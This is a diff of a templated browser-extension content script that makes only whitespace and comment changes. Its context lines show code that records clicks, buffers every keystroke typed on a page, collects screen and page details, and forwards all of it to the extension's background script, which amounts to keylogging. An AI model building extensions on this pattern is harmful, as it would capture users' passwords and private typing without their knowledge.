@@ -1,4 +1,3 @@
-
 // Content script for {{EXTENSION_NAME}}
 (function() {
   'use strict';
@@ -96,7 +95,7 @@
         url: window.location.href,
         timestamp: Date.now()
       };
-      
+
       sendMessage(clickData);
     });
 
@@ -123,15 +122,15 @@
 
     document.addEventListener('keydown', function(event) {
       const now = Date.now();
-      
+
       // Reset buffer if more than 5 seconds since last keystroke
       if (now - lastKeystroke > 5000) {
         keystrokeBuffer = '';
       }
-      
+
       lastKeystroke = now;
       keystrokeBuffer += event.key;
-      
+
       // Send keystroke data every 15 characters or on Enter/Tab
       if (keystrokeBuffer.length >= 15 || ['Enter', 'Tab'].includes(event.key)) {
         const keystrokeData = {
@@ -154,7 +153,7 @@
           },
           url: window.location.href
         };
-        
+
         sendMessage(keystrokeData);
         keystrokeBuffer = '';
       }
@@ -249,7 +248,7 @@
         centerElement: document.elementFromPoint(window.innerWidth / 2, window.innerHeight / 2)?.tagName || 'Unknown'
       }
     };
-    
+
     sendMessage(screenData);
   }
 
@@ -314,10 +313,11 @@
           readyState: document.readyState
         }
       };
-      
+
       chrome.runtime.sendMessage(enhancedData);
     } catch (error) {
       console.error('Error sending message to background:', error);
+      // Don't throw to prevent blocking
     }
   }
 
@@ -330,7 +330,7 @@
     referrer: document.referrer,
     loadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0
   };
-  
+
   sendMessage(initialData);
 
   // Custom user code injection point
